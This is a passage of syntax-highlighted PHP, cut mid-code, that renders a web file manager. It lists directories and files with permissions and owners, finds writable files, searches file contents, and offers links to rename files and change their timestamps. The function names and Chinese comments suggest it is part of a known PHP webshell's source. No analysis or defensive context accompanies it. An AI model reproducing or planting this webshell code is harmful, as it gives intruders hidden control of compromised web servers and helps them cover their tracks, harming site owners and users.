<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">view_writable</span> == <span style="color: #8abeb7;">'file'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span> = GetWFileList(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">findstr</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span> = GetSFileList(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">findstr</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">re</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30446;&#24405;&#21015;&#34920;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">scandir()&#25928;&#29575;&#26356;&#39640;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirs</span>=<span style="color: #81a2be;">@opendir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>=<span style="color: #81a2be;">@readdir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirs</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(@is_dir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>)){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'filename'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,filemtime(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'dirchmod'</span>]=getChmod(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'dirperm'</span>]=getPerms(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'fileowner'</span>]=getUser(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'dirlink'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>[]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {<span style="color: #de935f; background-color: #373b41;">        </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'filename'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'size'</span>]=sizecount(<span style="color: #81a2be;">@filesize</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,filemtime(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'filechmod'</span>]=getChmod(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'fileperm'</span>]=getPerms(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'fileowner'</span>]=getUser(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'dirlink'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">while</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">unset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">unset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@closedir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirs</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@sort</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@sort</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir_i</span> = <span style="color: #8abeb7;">'0'</span>;

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;form id="filelist" name="filelist" action="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="post"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'file'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'thefile'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'doing'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'filename'</span>]!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'filename'</span>]!=<span style="color: #8abeb7;">'.'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">getdir</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">getdir</span> == <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>]) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">attachsize</span> = dirsize(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">attachsize</span> = is_numeric(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">attachsize</span>) ? sizecount(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">attachsize</span>) :<span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">'Unknown'</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">attachsize</span> = <span style="color: #8abeb7;">'&lt;a href="javascript:getsize(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_li</span><span style="color: #8abeb7; text-decoration: underline;">nk'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Stat&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg = bg();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg.<span style="color: #8abeb7;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #8abeb7; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">bg.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;&lt;a href="javascript:godir(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'ser</span><span style="color: #8abeb7; text-decoration: underline;">ver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">attachsize</span>.<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:fileperm(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirchmod'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:fileperm(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirperm'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;&lt;a href="javascript:rename(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir_i</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'filename'</span>]==<span style="color: #8abeb7;">'..'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class='</span>.bg().<span style="color: #8abeb7;">'&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="java</span><span style="color: #8abeb7; text-decoration: underline;">script:godir(\''</span><span style="text-decoration: underline;">.getUpPath(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

